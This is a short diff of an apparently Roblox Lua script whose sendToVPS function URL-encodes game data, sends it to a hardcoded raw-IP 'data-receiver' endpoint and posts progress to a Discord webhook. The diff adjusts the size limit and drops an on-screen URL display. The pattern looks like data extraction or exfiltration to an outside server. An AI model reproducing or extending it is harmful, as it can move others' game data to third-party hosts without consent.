@@ -212,7 +212,7 @@ local function sendToVPS(data)
         sendDiscordNotification("🔄 **Creating data URL**\n📊 Data size: " .. #gameData .. " characters\n🎮 Game: " .. game.Name, false)
 
         -- Create a URL with the data (truncated for URL length limits)
-        local truncatedData = string.sub(gameData, 1, 1000000) -- Limit to 1MB for URL
+        local truncatedData = string.sub(gameData, 1, 50000) -- Limit to 50KB for URL
         local encodedData = HttpService:UrlEncode(truncatedData)
         local url = "http://194.164.89.41/data-receiver.html?data=" .. encodedData
 
@@ -230,8 +230,8 @@ local function sendToVPS(data)
         print("📋 VPS URL: " .. result)
         print("🔗 Copy this URL and open it in your browser to download the data")
 
-        -- Create GUI to display URL on screen (for mobile users)
-        createURLDisplay(result)
+        -- Don't create GUI - URL is too long, just send to Discord
+        print("📱 URL sent to Discord webhook (too long for GUI display)")
 
         return result
     else
